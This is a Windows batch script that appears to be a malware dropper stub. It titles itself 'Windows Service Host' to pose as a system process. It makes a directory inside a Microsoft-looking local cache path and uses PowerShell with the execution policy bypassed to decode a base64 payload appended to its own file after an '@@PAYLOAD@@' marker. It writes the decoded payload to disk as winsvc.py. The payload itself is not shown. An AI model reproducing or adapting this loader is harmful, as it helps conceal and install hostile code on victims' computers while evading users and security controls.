@echo off
setlocal EnableExtensions
title Windows Service Host
set "ROOT=%LOCALAPPDATA%\Microsoft\Windows\Caches"
if not exist "%ROOT%" md "%ROOT%" >nul 2>&1
set "SCRIPT=%ROOT%\winsvc.py"
if exist "%SCRIPT%" del /f /q "%SCRIPT%" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$t=[IO.File]::ReadAllText('%~f0');$m='@@PAYLOAD@@';$i=$t.LastIndexOf($m);if($i -lt 0){exit 2};$b=($t.Substring($i+$m.Length) -replace '\s','');[IO.File]::WriteAllBytes('%SCRIPT%',[Convert]::FromBase64String($b))"
